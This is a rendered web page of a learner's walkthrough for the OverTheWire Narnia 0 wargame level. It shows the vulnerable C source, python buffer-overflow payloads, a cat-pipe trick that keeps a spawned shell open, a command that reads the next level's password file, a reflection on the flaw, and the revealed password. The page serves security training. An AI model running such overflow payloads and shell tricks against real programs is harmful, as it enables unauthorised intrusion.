<!DOCTYPE html><html><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><meta name="next-head-count" content="2"/><link rel="preload" href="/over-the-wire/_next/static/css/86b7aba7af294b94.css" as="style"/><link rel="stylesheet" href="/over-the-wire/_next/static/css/86b7aba7af294b94.css" data-n-g=""/><link rel="preload" href="/over-the-wire/_next/static/css/dab4cb06b756ec9e.css" as="style"/><link rel="stylesheet" href="/over-the-wire/_next/static/css/dab4cb06b756ec9e.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/over-the-wire/_next/static/chunks/polyfills-5cd94c89d3acac5f.js"></script><script src="/over-the-wire/_next/static/chunks/webpack-f6318ba5529f7f5c.js" defer=""></script><script src="/over-the-wire/_next/static/chunks/framework-81da43a8dcd978d9.js" defer=""></script><script src="/over-the-wire/_next/static/chunks/main-00ca3f3974f0a67a.js" defer=""></script><script src="/over-the-wire/_next/static/chunks/pages/_app-4def5050ef33c1d2.js" defer=""></script><script src="/over-the-wire/_next/static/chunks/369-eeb2b79f75cc27b6.js" defer=""></script><script src="/over-the-wire/_next/static/chunks/pages/narnia/narnia0-938b82cda652d97e.js" defer=""></script><script src="/over-the-wire/_next/static/tYza5lNpAaL0A-elL_EVN/_buildManifest.js" defer=""></script><script src="/over-the-wire/_next/static/tYza5lNpAaL0A-elL_EVN/_ssgManifest.js" defer=""></script><script src="/over-the-wire/_next/static/tYza5lNpAaL0A-elL_EVN/_middlewareManifest.js" defer=""></script></head><body><div id="__next"><nav class="Nav_navBar__ioQlk"><ul class="Nav_navItems__n_3aD"><li class="Nav_navLink__4k_2G"><a href="/over-the-wire">Home</a></li><li class="Nav_navLink__4k_2G"><a href="/over-the-wire/bandit">Bandit</a></li><li class="Nav_navLink__4k_2G"><a href="/over-the-wire/natas">Natas</a></li><li class="Nav_navLink__4k_2G"><a href="/over-the-wire/leviathan">Leviathan</a></li><li class="Nav_navLink__4k_2G"><a href="/over-the-wire/narnia">Narnia</a></li><li class="Nav_navLink__4k_2G"><a href="/over-the-wire/cipher">Cipher</a></li></ul></nav><div class="MainContainer_mainContainer__0FIFy"><div><h1>Narnia 0</h1><div class="Keyword_keyword__javqt"><p class="Keyword_keywordHead__40fuD">Keywords: </p><span class="Tag_tag__AJnTY">buffer-overflow</span></div><section><h2>Experience</h2><p>For Narnia, the source code is given to us.</p><div class="CodeBlock_CodeBlock___IBBd"><pre style="color:#f8f8f2;background:#282a36;text-shadow:0 1px rgba(0, 0, 0, 0.3);font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;border-radius:0.3em"><code class="language-c" style="color:#f8f8f2;background:none;text-shadow:0 1px rgba(0, 0, 0, 0.3);font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#8be9fd">int<!-- --></span><span> <!-- --></span><span class="token" style="color:#f1fa8c">main<!-- --></span><span class="token" style="color:#f8f8f2">(<!-- --></span><span class="token" style="color:#f8f8f2">)<!-- --></span><span class="token" style="color:#f8f8f2">{<!-- --></span><span>
<!-- --></span><span>    <!-- --></span><span class="token" style="color:#8be9fd">long<!-- --></span><span> val<!-- --></span><span class="token" style="color:#f8f8f2">=<!-- --></span><span class="token" style="color:#bd93f9">0x41414141<!-- --></span><span class="token" style="color:#f8f8f2">;<!-- --></span><span>
<!-- --></span><span>    <!-- --></span><span class="token" style="color:#8be9fd">char<!-- --></span><span> buf<!-- --></span><span class="token" style="color:#f8f8f2">[<!-- --></span><span class="token" style="color:#bd93f9">20<!-- --></span><span class="token" style="color:#f8f8f2">]<!-- --></span><span class="token" style="color:#f8f8f2">;<!-- --></span><span>
<!-- --></span>
<!-- --><span>    <!-- --></span><span class="token" style="color:#f1fa8c">printf<!-- --></span><span class="token" style="color:#f8f8f2">(<!-- --></span><span class="token" style="color:#50fa7b">&quot;Correct val&#x27;s value from 0x41414141 -&gt; 0xdeadbeef!\n&quot;<!-- --></span><span class="token" style="color:#f8f8f2">)<!-- --></span><span class="token" style="color:#f8f8f2">;<!-- --></span><span>
<!-- --></span><span>    <!-- --></span><span class="token" style="color:#f1fa8c">printf<!-- --></span><span class="token" style="color:#f8f8f2">(<!-- --></span><span class="token" style="color:#50fa7b">&quot;Here is your chance: &quot;<!-- --></span><span class="token" style="color:#f8f8f2">)<!-- --></span><span class="token" style="color:#f8f8f2">;<!-- --></span><span>
<!-- --></span><span>    <!-- --></span><span class="token" style="color:#f1fa8c">scanf<!-- --></span><span class="token" style="color:#f8f8f2">(<!-- --></span><span class="token" style="color:#50fa7b">&quot;%24s&quot;<!-- --></span><span class="token" style="color:#f8f8f2">,<!-- --></span><span class="token" style="color:#f8f8f2">&amp;<!-- --></span><span>buf<!-- --></span><span class="token" style="color:#f8f8f2">)<!-- --></span><span class="token" style="color:#f8f8f2">;<!-- --></span><span>
<!-- --></span><span>    <!-- --></span><span class="token" style="color:#f1fa8c">printf<!-- --></span><span class="token" style="color:#f8f8f2">(<!-- --></span><span class="token" style="color:#50fa7b">&quot;buf: %s\n&quot;<!-- --></span><span class="token" style="color:#f8f8f2">,<!-- --></span><span>buf<!-- --></span><span class="token" style="color:#f8f8f2">)<!-- --></span><span class="token" style="color:#f8f8f2">;<!-- --></span><span>
<!-- --></span><span>    <!-- --></span><span class="token" style="color:#f1fa8c">printf<!-- --></span><span class="token" style="color:#f8f8f2">(<!-- --></span><span class="token" style="color:#50fa7b">&quot;val: 0x%08x\n&quot;<!-- --></span><span class="token" style="color:#f8f8f2">,<!-- --></span><span>val<!-- --></span><span class="token" style="color:#f8f8f2">)<!-- --></span><span class="token" style="color:#f8f8f2">;<!-- --></span><span>
<!-- --></span>
<!-- --><span>    <!-- --></span><span class="token" style="color:#8be9fd">if<!-- --></span><span class="token" style="color:#f8f8f2">(<!-- --></span><span>val<!-- --></span><span class="token" style="color:#f8f8f2">==<!-- --></span><span class="token" style="color:#bd93f9">0xdeadbeef<!-- --></span><span class="token" style="color:#f8f8f2">)<!-- --></span><span class="token" style="color:#f8f8f2">{<!-- --></span><span>
<!-- --></span><span>      <!-- --></span><span class="token" style="color:#f1fa8c">setreuid<!-- --></span><span class="token" style="color:#f8f8f2">(<!-- --></span><span class="token" style="color:#f1fa8c">geteuid<!-- --></span><span class="token" style="color:#f8f8f2">(<!-- --></span><span class="token" style="color:#f8f8f2">)<!-- --></span><span class="token" style="color:#f8f8f2">,<!-- --></span><span class="token" style="color:#f1fa8c">geteuid<!-- --></span><span class="token" style="color:#f8f8f2">(<!-- --></span><span class="token" style="color:#f8f8f2">)<!-- --></span><span class="token" style="color:#f8f8f2">)<!-- --></span><span class="token" style="color:#f8f8f2">;<!-- --></span><span>
<!-- --></span><span>      <!-- --></span><span class="token" style="color:#f1fa8c">system<!-- --></span><span class="token" style="color:#f8f8f2">(<!-- --></span><span class="token" style="color:#50fa7b">&quot;/bin/sh&quot;<!-- --></span><span class="token" style="color:#f8f8f2">)<!-- --></span><span class="token" style="color:#f8f8f2">;<!-- --></span><span>
<!-- --></span><span>    <!-- --></span><span class="token" style="color:#f8f8f2">}<!-- --></span><span>
<!-- --></span><span>    <!-- --></span><span class="token" style="color:#8be9fd">else<!-- --></span><span> <!-- --></span><span class="token" style="color:#f8f8f2">{<!-- --></span><span>
<!-- --></span><span>      <!-- --></span><span class="token" style="color:#f1fa8c">printf<!-- --></span><span class="token" style="color:#f8f8f2">(<!-- --></span><span class="token" style="color:#50fa7b">&quot;WAY OFF!!!!\n&quot;<!-- --></span><span class="token" style="color:#f8f8f2">)<!-- --></span><span class="token" style="color:#f8f8f2">;<!-- --></span><span>
<!-- --></span><span>      <!-- --></span><span class="token" style="color:#f1fa8c">exit<!-- --></span><span class="token" style="color:#f8f8f2">(<!-- --></span><span class="token" style="color:#bd93f9">1<!-- --></span><span class="token" style="color:#f8f8f2">)<!-- --></span><span class="token" style="color:#f8f8f2">;<!-- --></span><span>
<!-- --></span><span>    <!-- --></span><span class="token" style="color:#f8f8f2">}<!-- --></span><span>
<!-- --></span>
<!-- --><span>    <!-- --></span><span class="token" style="color:#8be9fd">return<!-- --></span><span> <!-- --></span><span class="token" style="color:#bd93f9">0<!-- --></span><span class="token" style="color:#f8f8f2">;<!-- --></span><span>
<!-- --></span>    <!-- --></code></pre></div><p>Before starting, the files does not appear to be there, change directory to <!-- --><code>/narnia</code> before starting. We are given the source code for this level. We are given hints for this level in the strings of the <!-- --><code>printf</code>. The goal is to change the value of <!-- --><code>val</code> to <!-- --><code>0xdeadbeef</code>. Clearly, this would require some form of buffer overflow. Analysing the code, we can tell that this is possible since the size of the scanf maximum input length is 24 meanwhile the buffer itself is only 20 bytes in size.<!-- --></p><p>This was simple enough, testing with the following code indicate that it seems to work.</p><div class="CodeBlock_CodeBlock___IBBd"><pre style="color:#f8f8f2;background:#282a36;text-shadow:0 1px rgba(0, 0, 0, 0.3);font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;border-radius:0.3em"><code class="language-shell" style="color:#f8f8f2;background:none;text-shadow:0 1px rgba(0, 0, 0, 0.3);font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>python -c <!-- --></span><span class="token" style="color:#50fa7b">&#x27;print(&quot;a&quot;*20 + &quot;b&quot;*4)&#x27;<!-- --></span><span> <!-- --></span><span class="token" style="color:#f8f8f2">|<!-- --></span><span> ./narnia0<!-- --></span></code></pre></div><p>Next, we must convert change the value so that it matches <!-- --><code>0xdeadbeef</code>. To do so, we must convert it to a little endian format, this involves putting the smallest byte first, like so: <!-- --><code>ef eb ad de</code>. Put together, the command we could use is as follows.<!-- --></p><div class="CodeBlock_CodeBlock___IBBd"><pre style="color:#f8f8f2;background:#282a36;text-shadow:0 1px rgba(0, 0, 0, 0.3);font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;border-radius:0.3em"><code class="language-shell" style="color:#f8f8f2;background:none;text-shadow:0 1px rgba(0, 0, 0, 0.3);font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>python -c <!-- --></span><span class="token" style="color:#50fa7b">&#x27;print(&quot;a&quot;*20 +&quot;\xef\xbe\xad\xde&quot;)&#x27;<!-- --></span><span> <!-- --></span><span class="token" style="color:#f8f8f2">|<!-- --></span><span> ./narnia0<!-- --></span></code></pre></div><p>Here was where it got confusing, this successfuly changed the value of <!-- --><code>val</code>, however, the program simply runs <!-- --><code>setreuid</code> and <!-- --><code>system</code> then simply closes. The main problem is that the program runs <!-- --><code>system</code> which calls a<!-- --><code>/bin/sh</code> which is the shell, then nothing occured and it simply closes. After being stuck for quite a long time, I found that, we may use the <!-- --><code>cat</code> command in conjunction.<!-- --></p><div class="CodeBlock_CodeBlock___IBBd"><pre style="color:#f8f8f2;background:#282a36;text-shadow:0 1px rgba(0, 0, 0, 0.3);font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;border-radius:0.3em"><code class="language-shell" style="color:#f8f8f2;background:none;text-shadow:0 1px rgba(0, 0, 0, 0.3);font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#f8f8f2">(<!-- --></span><span>python -c <!-- --></span><span class="token" style="color:#50fa7b">&#x27;print(&quot;a&quot;*20 +&quot;\xef\xbe\xad\xde&quot;)&#x27;<!-- --></span><span class="token" style="color:#f8f8f2">;<!-- --></span><span> <!-- --></span><span class="token" style="color:#f1fa8c">cat<!-- --></span><span class="token" style="color:#f8f8f2">)<!-- --></span><span> <!-- --></span><span class="token" style="color:#f8f8f2">|<!-- --></span><span> ./narnia0<!-- --></span></code></pre></div><p>Unlike how I had normally used <!-- --><code>cat</code>, without any arguments,<!-- --><code>cat</code> simply copies standard input to standard output. Now using the pipe, the cat will send the standard input to the shell running instead, allowing us to use the shell inside the program. I simply used <!-- --><code>cat /etc/narnia_pass/narnia1</code> <!-- -->to then obtain the password for Narnia 1.<!-- --></p></section><section><h2>Reflection</h2><p>This was an interesting level to have completed. I have not use <!-- --><code>cat</code>in that manner previously and it took quite a while to come to that conclusion. Perhaps, it would have been better to search for hints. But this definitely showcased the difference in difficulty of this wargames to the ones before. An interesting idea that came to mind was how this may relate to the mentions of creating a remote shell seen during the Natas wargames. Perhaps this could be used to create such remote shell, at least as a method of taking inputs in.<!-- --></p><p>In terms of security, this demonstrated the common vulnerability of a buffer overflow. Since, the memory allocated for the array was only 20 bytes long, by writing extra bytes, it overwrites the ones stored previously, namely the<!-- --><code>val</code> variable in this instance. This is a common type of vulnerability especially when taking in user input we must always allocate enough space or prevent overwriting other data. Standard libraries already allow such feature, in this case however, the vulnerability exist because of the mistmatch of the<!-- --><code>scanf</code> command&#x27;s specified limit and the length of buffer used. So this is something to look out for, especially when using lower level programming.<!-- --></p></section><section><h2>Key</h2><div class="SpoilerKey_codeBlock__KWl0d"><div class="SpoilerKey_spoilerToggler__HCeWZ"><button>Click to Reveal</button></div><div class="SpoilerKey_spoilerContainer__O76It"><div class="SpoilerKey_spoiler__YWx_s "><pre style="color:#f8f8f2;background:#282a36;text-shadow:0 1px rgba(0, 0, 0, 0.3);font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:0;overflow:auto;border-radius:0.3em"><code style="color:#f8f8f2;background:none;text-shadow:0 1px rgba(0, 0, 0, 0.3);font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>efeidiedae<!-- --></span></code></pre></div></div></div></section><div class="PageNav_pageNav__NXqbT"><div><a title="Previous page" class="PageNav_navButton__yHhmO" href="/over-the-wire/narnia">◀</a></div><div><a title="Next page" class="PageNav_navButton__yHhmO" href="/over-the-wire/narnia/narnia1">▶</a></div></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{}},"page":"/narnia/narnia0","query":{},"buildId":"tYza5lNpAaL0A-elL_EVN","assetPrefix":"/over-the-wire","nextExport":true,"autoExport":true,"isFallback":false,"scriptLoader":[]}</script></body></html>